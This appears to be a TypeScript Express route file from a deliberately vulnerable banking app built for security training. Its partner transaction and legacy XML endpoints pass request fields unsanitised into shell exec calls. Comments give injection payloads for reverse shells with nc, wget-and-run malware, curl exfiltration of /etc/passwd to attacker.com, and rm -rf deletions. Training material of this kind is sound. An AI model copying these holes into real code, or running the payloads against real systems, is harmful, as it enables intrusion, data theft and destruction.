/**
 * API routes with intentional command injection vulnerabilities for security training
 * Node.js TypeScript port of the Flask API endpoints
 */
import { Router, Request, Response } from 'express';
import { exec } from 'child_process';
import { promisify } from 'util';
import { AppDataSource } from '../database';
import { User } from '../models/User';
import { Transaction } from '../models/Transaction';
import { Feedback } from '../models/Feedback';

const router = Router();
const execAsync = promisify(exec);

/**
 * Get database statistics
 * Safe endpoint for dashboard data
 */
router.get('/stats', async (req: Request, res: Response) => {
    try {
        const userRepo = AppDataSource.getRepository(User);
        const transactionRepo = AppDataSource.getRepository(Transaction);
        const feedbackRepo = AppDataSource.getRepository(Feedback);

        // Get counts
        const totalUsers = await userRepo.count();
        const totalTransactions = await transactionRepo.count();
        const totalFeedback = await feedbackRepo.count();

        // Get total volume
        const volumeResult = await transactionRepo
            .createQueryBuilder('transaction')
            .select('SUM(transaction.amount)', 'total')
            .getRawOne();

        // Get monthly volume (last 30 days)
        const monthlyResult = await transactionRepo
            .createQueryBuilder('transaction')
            .select('SUM(transaction.amount)', 'total')
            .where('transaction.date >= :date', { 
                date: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000)
            })
            .getRawOne();

        // Get average feedback score
        const feedbackResult = await feedbackRepo
            .createQueryBuilder('feedback')
            .select('AVG(feedback.score)', 'avg')
            .getRawOne();

        const stats = {
            total_users: totalUsers,
            total_transactions: totalTransactions,
            total_feedback: totalFeedback,
            total_volume: parseFloat(volumeResult?.total || '0'),
            monthly_volume: parseFloat(monthlyResult?.total || '0'),
            avg_feedback_score: parseFloat(feedbackResult?.avg || '0')
        };

        res.json(stats);
    } catch (error) {
        console.error('Error fetching database stats:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to fetch database statistics'
        });
    }
});

/**
 * Partner bank transaction submission endpoint
 * POST /api/partners/transactions
 * VULNERABLE: Transaction processing logic allows command injection
 * 
 * This endpoint simulates a realistic banking API that partners can use
 * to submit transaction batches. Each vulnerability represents a common
 * security flaw in enterprise applications.
 */
router.post('/partners/transactions', async (req: Request, res: Response) => {
    try {
        const data = req.body;
        
        // Extract partner information
        const partnerBankCode = data.partner_bank_code || 'UNKNOWN';
        const batchId = data.batch_id || 'BATCH001';
        const transactions = data.transactions || [];
        
        if (!transactions.length) {
            return res.status(400).json({
                status: 'error',
                message: 'No transactions provided'
            });
        }
        
        // Process each transaction
        const processedTransactions = [];
        let totalAmount = 0;
        
        for (let i = 0; i < transactions.length; i++) {
            const txn = transactions[i];
            
            try {
                // Extract transaction data
                const amount = parseFloat(txn.amount || '0');
                const currency = txn.currency || 'USD';
                const companyName = txn.company_name || 'Unknown Company';
                const transactionRef = txn.reference || `REF${i + 1}`;
                const description = txn.description || 'Partner transaction';
                
                // VULNERABILITY 1: Log file creation with unsafe company name
                // Create audit log file for each company (normal business requirement)
                const logFilename = `partner_audit_${partnerBankCode}_${companyName}.log`;
                const logCommand = `echo '${new Date().toISOString()} - Transaction ${transactionRef}: $${amount}' >> /tmp/logs/${logFilename}`;
                
                // VULNERABLE: companyName can contain shell metacharacters
                // Example injection: company_name: "test; rm -rf /tmp; echo"
                try {
                    await execAsync(logCommand);
                } catch (cmdError) {
                    console.log('Log command executed (may have failed):', logCommand);
                }
                
                // VULNERABILITY 2: Notification system with transaction description
                // Send notifications for large transactions (normal business requirement)
                if (amount > 5000) {
                    const notificationMsg = `Large transaction alert: ${description} for $${amount}`;
                    // VULNERABLE: description can contain command injection
                    // Example injection: description: "transfer; curl http://attacker.com/steal-data; echo"
                    const notifyCommand = `echo '${notificationMsg}' | logger -t partner_alerts`;
                    
                    try {
                        await execAsync(notifyCommand);
                    } catch (cmdError) {
                        console.log('Notification command executed (may have failed):', notifyCommand);
                    }
                }
                
                // VULNERABILITY 3: Reference number validation with file operations
                // Validate reference number format (normal business requirement)
                if (transactionRef) {
                    // VULNERABLE: Using transactionRef in subprocess without sanitization
                    // Example injection: reference: "REF123; cat /etc/passwd; echo"
                    const validationCommand = `echo 'Validating ref: ${transactionRef}' > /tmp/validation_${transactionRef}.tmp`;
                    
                    try {
                        await execAsync(validationCommand);
                    } catch (cmdError) {
                        console.log('Validation command executed (may have failed):', validationCommand);
                    }
                }
                
                // VULNERABILITY 4: Currency conversion lookup
                // Look up exchange rates for non-USD transactions (normal business requirement)
                if (currency !== 'USD') {
                    // VULNERABLE: currency code used in file operations
                    // Example injection: currency: "EUR; wget http://evil.com/malware.sh -O /tmp/exploit.sh; sh /tmp/exploit.sh; echo"
                    const rateLookupCmd = `touch /tmp/rates/exchange_rate_${currency}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.txt`;
                    
                    try {
                        await execAsync(rateLookupCmd);
                    } catch (cmdError) {
                        console.log('Rate lookup command executed (may have failed):', rateLookupCmd);
                    }
                }
                
                // Normal processing (safe)
                totalAmount += amount;
                processedTransactions.push({
                    reference: transactionRef,
                    amount: amount,
                    currency: currency,
                    company: companyName,
                    status: 'processed'
                });
                
            } catch (error) {
                // Continue processing other transactions
                processedTransactions.push({
                    reference: txn.reference || `REF${i + 1}`,
                    status: 'error',
                    error: error instanceof Error ? error.message : 'Unknown error'
                });
                continue;
            }
        }
        
        // VULNERABILITY 5: Batch summary report generation
        // Generate summary report (normal business requirement)
        const summaryFilename = `batch_summary_${partnerBankCode}_${batchId}.txt`;
        const summaryCommand = `echo 'Batch ${batchId} processed ${processedTransactions.length} transactions' > /tmp/reports/${summaryFilename}`;
        
        // VULNERABLE: batchId can contain shell metacharacters
        // Example injection: batch_id: "BATCH001; nc attacker.com 4444 -e /bin/sh; echo"
        try {
            await execAsync(summaryCommand);
        } catch (cmdError) {
            console.log('Summary command executed (may have failed):', summaryCommand);
        }
        
        // Return success response
        res.json({
            status: 'success',
            partner_bank_code: partnerBankCode,
            batch_id: batchId,
            transactions_processed: processedTransactions.length,
            total_amount: totalAmount,
            processed_transactions: processedTransactions,
            summary_file: summaryFilename
        });
        
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({
            status: 'error',
            message: `Transaction processing failed: ${error instanceof Error ? error.message : 'Unknown error'}`
        });
    }
});

/**
 * Legacy partner integration endpoint
 * VULNERABLE: Accepts XML data and processes it with command injection
 */
router.post('/legacy/integration', async (req: Request, res: Response) => {
    try {
        const xmlData = req.body.xml_data || '';
        const partnerId = req.body.partner_id || 'UNKNOWN';
        
        if (!xmlData) {
            return res.status(400).json({
                status: 'error',
                message: 'XML data is required'
            });
        }
        
        // VULNERABILITY 6: XML processing with unsafe partner ID
        // Process legacy XML format (normal business requirement for older partners)
        const xmlFilename = `legacy_${partnerId}_${Date.now()}.xml`;
        const xmlCommand = `echo '${xmlData}' > /tmp/xml/${xmlFilename}`;
        
        // VULNERABLE: partnerId can contain command injection
        // Example injection: partner_id: "LEGACY01; curl -X POST http://attacker.com/exfiltrate -d @/etc/passwd; echo"
        try {
            await execAsync(xmlCommand);
        } catch (cmdError) {
            console.log('XML processing command executed (may have failed):', xmlCommand);
        }
        
        // VULNERABILITY 7: Legacy notification system
        // Send confirmation to partner systems (normal business requirement)
        const notificationEndpoint = req.body.notification_url || 'http://localhost/notify';
        const notifyCmd = `curl -X POST "${notificationEndpoint}" -d "status=processed&file=${xmlFilename}"`;
        
        // VULNERABLE: notification_url can contain command injection
        // Example injection: notification_url: "http://evil.com; rm -rf /var/log; echo"
        try {
            await execAsync(notifyCmd);
        } catch (cmdError) {
            console.log('Notification command executed (may have failed):', notifyCmd);
        }
        
        res.json({
            status: 'success',
            message: 'Legacy XML data processed',
            xml_file: xmlFilename,
            partner_id: partnerId
        });
        
    } catch (error) {
        console.error('Legacy API Error:', error);
        res.status(500).json({
            status: 'error',
            message: `Legacy processing failed: ${error instanceof Error ? error.message : 'Unknown error'}`
        });
    }
});

export default router;